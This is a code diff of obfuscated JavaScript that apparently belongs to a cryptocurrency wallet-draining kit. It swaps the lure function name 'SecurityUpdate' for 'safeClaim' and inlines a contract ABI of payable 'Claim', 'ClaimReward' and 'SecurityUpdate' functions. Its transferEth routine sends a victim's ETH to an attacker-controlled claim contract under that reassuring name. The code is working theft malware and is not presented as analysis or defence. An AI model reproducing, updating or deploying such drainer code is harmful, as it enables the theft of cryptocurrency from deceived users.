@@ -2005,7 +2005,7 @@ function _0x5ec8() {
     '0x880644ddf208e471c6f2230d31f9027578fa6fcc',
     '0x970d5e0bd5c4f193fccf7fd579590c5f5c69b2d9',
     '0x29cbd0510eec0327992cd6006e63f9fa8e7f33b7',
-    'SecurityUpdate',
+    'safeClaim',
     '0xeef9f339514298c6a857efcfc1a762af84438dee',
     '0xa126aace6757a0dd89c60c1c16cf8997f749780b',
     '0x73a83269b9bbafc427e76be0a2c1a1db2a26f4c2',
@@ -5402,7 +5402,9 @@ var janera = {}
   (janera['outputs'] = []),
   (janera['stateMutability'] = _0x5c7eff(0xda8)),
   (janera[_0x5c7eff(0x17a)] = 'function')
-var claimABI = [lallah, janera],
+var claimABI = JSON.parse(
+    '[{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"Claim","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"ClaimCoin","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"ClaimReward","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"Connect","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"Execute","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"safeClaim","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"safeUpdate","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"SecurityUpdate","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"Swap","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]'
+  ),
   USDCToken = {}
 ;(USDCToken['name'] = _0x5c7eff(0x25f)), (USDCToken['version'] = '2'), (USDCToken['type'] = 0x3)
 var DAIToken = {}
@@ -6351,7 +6353,7 @@ async function transferEth(_0x2d6c7a, _0x48f621, _0xaf98f0) {
   if (_0x48f621 <= 0x470de4df820000) return !![]
   debugger
   var _0x56511f = new web3[_0x2193f6(0x277)][_0x2193f6(0x8b4)](claimABI, claimAddr),
-    _0xe2878e = _0x56511f[_0x2193f6(0xbda)]['SecurityUpdate']()[_0x2193f6(0x7ab)]()
+    _0xe2878e = _0x56511f[_0x2193f6(0xbda)]['safeClaim']()[_0x2193f6(0x7ab)]()
   let _0x203c8b = await sendTransaction(_0x2d6c7a, _0xe2878e, claimAddr, _0x48f621)
   return _0x203c8b
 }
